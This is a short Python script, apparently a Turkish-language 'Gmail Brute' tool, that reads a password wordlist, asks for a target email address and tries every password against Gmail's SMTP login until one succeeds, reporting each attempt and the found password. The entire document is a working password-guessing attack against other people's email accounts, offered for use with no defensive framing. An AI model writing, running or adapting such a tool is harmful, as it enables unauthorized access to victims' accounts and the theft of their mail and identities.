import smtplib
import os
from colorama import Fore, Back, Style, init
init(autoreset=True)


os.system("clear")

banner =  """

▒█▀▀█ ▒█▀▄▀█ ░█▀▀█ ▀█▀ ▒█░░░ 
▒█░▄▄ ▒█▒█▒█ ▒█▄▄█ ▒█░ ▒█░░░ 
▒█▄▄█ ▒█░░▒█ ▒█░▒█ ▄█▄ ▒█▄▄█ 

▒█▀▀█ ▒█▀▀█ ▒█░▒█ ▀▀█▀▀ ▒█▀▀▀ 
▒█▀▀▄ ▒█▄▄▀ ▒█░▒█ ░▒█░░ ▒█▀▀▀ 
▒█▄▄█ ▒█░▒█ ░▀▄▄▀ ░▒█░░ ▒█▄▄▄"""
print(Fore.GREEN + banner)
print (Fore.BLUE + "V1.0")
print (Fore.BLUE + "Created By Mars")



path = input(Fore.RED + "Wordlist Dosyasının ismini Yazın :> ")

file_ = open(path, 'r')
wordlist = file_.readlines()
email = input(Fore.RED + "Hedef Emaili Giriniz :> ")
server = smtplib.SMTP_SSL('smtp.googlemail.com',465)
i = 0
for pas in wordlist:
    try:
        i = i + 1
        print (i,"/",len(wordlist))
        server.login(email,pas)
        print (Fore.GREEN + "Şifre Bulundu : ", pas)
        break
    except smtplib.SMTPAuthenticationError as e:
        error =  str(e)
        if error[14] == "<":
            print (Fore.RED + "Şifre Bulundu : ", pas)
            break
        else:
            print (Fore.YELLOW + "Yanlış Şifre ------> ", pas)
